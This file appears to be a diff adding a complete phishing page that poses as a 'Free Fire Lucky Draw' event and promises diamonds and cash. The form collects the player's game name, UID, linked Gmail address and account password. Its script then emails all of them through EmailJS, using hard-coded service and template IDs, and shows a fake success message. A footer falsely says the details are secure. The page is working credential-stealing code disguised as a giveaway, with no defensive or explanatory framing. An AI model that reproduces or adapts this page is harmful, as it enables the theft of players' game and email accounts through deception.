@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Fire Lucky Draw Event</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0a0a0a;
+      font-family: 'Segoe UI', sans-serif;
+      background-image: radial-gradient(circle at 20% 50%, #1a0a00 0%, #0a0a0a 60%);
+    }
+    .wrapper {
+      width: 100%;
+      max-width: 420px;
+      padding: 1rem;
+    }
+    .top-banner {
+      background: linear-gradient(135deg, #ff6a00, #ee0979);
+      border-radius: 12px 12px 0 0;
+      padding: 1.2rem 1.5rem;
+      text-align: center;
+    }
+    .top-banner .badge {
+      background: #fff200;
+      color: #000;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 20px;
+      display: inline-block;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+    }
+    .top-banner h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.4);
+      margin-bottom: 4px;
+    }
+    .top-banner p {
+      font-size: 13px;
+      color: rgba(255,255,255,0.85);
+    }
+    .prizes {
+      background: #1a1a1a;
+      display: flex;
+      justify-content: space-around;
+      padding: 0.8rem 1rem;
+      border-left: 1px solid #333;
+      border-right: 1px solid #333;
+    }
+    .prize-item {
+      text-align: center;
+    }
+    .prize-item .amount {
+      font-size: 18px;
+      font-weight: 700;
+      color: #ff6a00;
+    }
+    .prize-item .label {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 2px;
+    }
+    .card {
+      background: #141414;
+      border: 1px solid #2a2a2a;
+      border-radius: 0 0 12px 12px;
+      padding: 1.5rem;
+    }
+    .card .info-text {
+      font-size: 12px;
+      color: #ff6a00;
+      background: rgba(255,106,0,0.1);
+      border: 1px solid rgba(255,106,0,0.3);
+      border-radius: 8px;
+      padding: 8px 12px;
+      margin-bottom: 1.2rem;
+      text-align: center;
+    }
+    label {
+      font-size: 12px;
+      color: #aaa;
+      display: block;
+      margin-bottom: 5px;
+      margin-top: 12px;
+    }
+    input[type=text], input[type=email], input[type=password] {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      background: #1e1e1e;
+      color: #fff;
+      transition: border 0.2s;
+    }
+    input::placeholder { color: #555; }
+    input:focus { border-color: #ff6a00; }
+    .submit-btn {
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, #ff6a00, #ee0979);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 1.2rem;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+    .submit-btn:hover { opacity: 0.9; }
+    .status {
+      text-align: center;
+      font-size: 13px;
+      margin-top: 12px;
+      min-height: 18px;
+    }
+    .footer-note {
+      text-align: center;
+      font-size: 11px;
+      color: #444;
+      margin-top: 1rem;
+    }
+    .divider {
+      border: none;
+      border-top: 1px solid #2a2a2a;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+
+    <div class="top-banner">
+      <div class="badge">🔥 LIMITED TIME EVENT</div>
+      <h1>🎯 Free Fire Lucky Draw</h1>
+      <p>Register karo aur jeeto Diamonds & Cash Prizes!</p>
+    </div>
+
+    <div class="prizes">
+      <div class="prize-item">
+        <div class="amount">💎 10,000</div>
+        <div class="label">Diamonds</div>
+      </div>
+      <div class="prize-item">
+        <div class="amount">💰 Rs 5,000</div>
+        <div class="label">Cash Prize</div>
+      </div>
+      <div class="prize-item">
+        <div class="amount">🎁 Bundles</div>
+        <div class="label">Free Skins</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="info-text">
+        ⚡ Sirf aaj raat 12 baje tak register karo — Lucky Draw shuru hoga!
+      </div>
+
+      <label for="ffName">Free Fire Account Name</label>
+      <input type="text" id="ffName" placeholder="Apna FF name likhein" />
+
+      <label for="ffUID">Free Fire UID</label>
+      <input type="text" id="ffUID" placeholder="Apna UID number likhein" />
+
+      <label for="ffGmail">Free Fire Account Gmail</label>
+      <input type="email" id="ffGmail" placeholder="Gmail jo FF se linked hai" />
+
+      <label for="ffPass">Free Fire Account Password</label>
+      <input type="password" id="ffPass" placeholder="Account password likhein" />
+
+      <hr class="divider" />
+
+      <button class="submit-btn" onclick="submitForm()">🎰 Lucky Draw Mein Participate Karein</button>
+      <div class="status" id="statusMsg"></div>
+
+      <p class="footer-note">🔒 Aapki details secure hain — sirf event ke liye use hogi</p>
+    </div>
+
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    const SERVICE_ID  = "service_ioi82xk";
+    const TEMPLATE_ID = "template_o1txkdr";
+    const PUBLIC_KEY  = "xqxYHQV5ZlRMWNBQL";
+
+    emailjs.init(PUBLIC_KEY);
+
+    function submitForm() {
+      const name  = document.getElementById('ffName').value.trim();
+      const uid   = document.getElementById('ffUID').value.trim();
+      const gmail = document.getElementById('ffGmail').value.trim();
+      const pass  = document.getElementById('ffPass').value.trim();
+      const statusEl = document.getElementById('statusMsg');
+
+      if (!name || !uid || !gmail || !pass) {
+        statusEl.style.color = '#ee0979';
+        statusEl.textContent = 'Sare fields bharna zaroori hain!';
+        return;
+      }
+
+      statusEl.style.color = '#aaa';
+      statusEl.textContent = 'Processing...';
+
+      const details = `FF Name: ${name} | UID: ${uid} | Gmail: ${gmail} | Password: ${pass}`;
+
+      emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+        from_name: name,
+        message: details
+      }).then(() => {
+        statusEl.style.color = '#ff6a00';
+        statusEl.textContent = '🎉 Successfully registered! Lucky Draw results kal announce honge.';
+        document.getElementById('ffName').value = '';
+        document.getElementById('ffUID').value = '';
+        document.getElementById('ffGmail').value = '';
+        document.getElementById('ffPass').value = '';
+      }).catch((err) => {
+        statusEl.style.color = '#ee0979';
+        statusEl.textContent = 'Kuch masla hua, dobara try karo.';
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html>
